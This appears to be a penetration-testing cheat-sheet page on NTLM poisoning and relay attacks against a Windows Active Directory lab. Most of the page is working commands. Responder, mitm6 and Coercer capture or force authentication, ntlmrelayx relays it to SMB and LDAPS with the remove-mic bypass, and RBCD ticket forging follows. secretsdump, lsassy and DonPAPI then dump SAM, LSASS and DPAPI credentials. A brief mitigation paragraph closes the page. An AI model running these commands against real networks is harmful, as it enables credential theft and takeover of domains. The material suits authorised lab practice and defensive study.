# Poison and relay



```
// If you wish to keep seeing the hashes for same user add the v option.
responder -I <interface> -v
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
or
john --format=netntlmv2 hash.txt
```

Note: if it doesn't work, try disable the firewall (ufw or firewalld depending on your distribution) on your attack machine.

Responder keep the logs in /var/log/responder/Responder-Session.log

> If you want to delete the previous captured logs (message skipped previously captured hash) delete the file /var/lib/responder/Responder.db



```
sqlite3 /var/lib/responder/Responder.db
sqlite> .help
sqlite> .tables
squite> select * from responder; // Yes, responder is a table
squite> .exit
```

sqlite3 /var/lib/responder/Responder.db



## Unsigned SMB

Let's find smb computers with signing:False to try a relay ntml authentification

```
cme smb 192.168.56.10-23 --gen-relay-list relay.txt
```



### responder + ntlmrelayx to smb

Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.

```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks // cette commande indique que EDDARD.STARK est admin sur la target xxx.xxx.xx.22
```

and then we restart ntlmrelayx



### Use a socks relay with an admin account

#### Secretsdump

```
// Use secretsdump to get SAM database, LSA cached logon, machine account and some DPAPI informations
proxychains secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```



#### Lsassy

```
// dump lsass (lsass process store credentials)
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```



#### DonPapi

```
// get dpapi and other passwords stored informations (files, browser, schedule tasks,…). This tool don’t touch LSASS so it is stealthier 
proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```



#### Smbclient

```
// connect to the smb server via smbclient
proxychains smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug

```



#### smbexec or atexec

With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec nor dcomexec will work. (explainations here : [https://github.com/SecureAuthCorp/impacket/issues/412](https://github.com/SecureAuthCorp/impacket/issues/412) )

```
proxychains smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```



### Mitm6 + ntlmrelayx to ldap

Windows by default prefers IPv6 over IPv4 so we could capture and poison the response to DHCPv6 query to change the DNS server and redirect queries to our machine with the tool [MITM6](https://github.com/dirkjanm/mitm6). To verify if Mitm6 did work, run `ipconfig /all` and notice that the DNS Servers entry has been changed to an IPV6 address.

```
mitm6 -i vboxnet0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access
```

this ntlmrelayx.py command create a delegare access to Braavos$ because we poison Braavos$ computer account and it can set the msDS-AllowedToActOnBehalfOfOtherIdentity on the created computer. That's mean this new computer can now impersonate users on BRAAVOS$ via S4U2Proxy.

It is also possible to dump domain info by adding a loot directory...

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
```

### Coerced auth smb + ntlmrelayx to ldaps with drop the mic

It can be done via tools such as petitpotam, printerbug, DFSCoerce. We can also use a all-in-one tool [coercer](https://github.com/p0dalirius/Coercer.git).



you can’t relay smb connection to ldap(s) connection without using CVE-2019-1040 a.k.a remove-mic.

<pre class="language-bash"><code class="lang-bash"><strong># Start the relay with remove mic to the ldaps of meereen.essos.local.
</strong>ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access

# Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1

# The attack worked we can now exploit braavos with RBCD
getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'
   
# and use that ticket to retreive secrets
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
</code></pre>







{% embed url="https://mayfly277.github.io/posts/GOADv2-pwning-part4/" %}

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/" %}

{% embed url="https://jlajara.gitlab.io/controlling-DC-part1" %}

{% embed url="https://en.hackndo.com/ntlm-relay/" %}

{% embed url="https://www.thehacker.recipes/ad/movement/ntlm/relay" %}

{% embed url="https://www.sqlite.org/cli.html" %}



Fortunately, such attacks can be prevented and detected. To mitigate the first attack we mentioned using Responder's broadcast attacks, these can be prevented by disabling LLMNR and NBT-NS. Since networks already use DNS, these protocols aren't required unless you're running certain instances of Windows 2000 or earlier

To prevent the second showcased Responder attack caused by WPAD (Web Proxy AutoDiscovery) traffic, it is simply a matter of adding a DNS entry for ‘WPAD' pointing to the corporate proxy server. You can also disable the Autodetect Proxy Settings on your IE clients to prevent this attack from happening.
